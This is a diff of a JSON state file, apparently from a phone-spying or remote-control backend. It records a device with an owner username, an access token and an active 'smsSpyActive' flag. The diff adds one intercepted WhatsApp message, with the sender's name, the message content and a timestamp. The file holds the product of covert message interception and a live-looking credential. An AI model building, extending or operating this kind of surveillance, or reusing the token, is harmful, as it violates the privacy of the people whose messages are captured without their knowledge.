@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776853427567,
+    "lastSeen": 1776853442434,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -9209,6 +9209,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Rezky",
+        "content": "Iye",
+        "time": "22/04 18:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776853444700
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
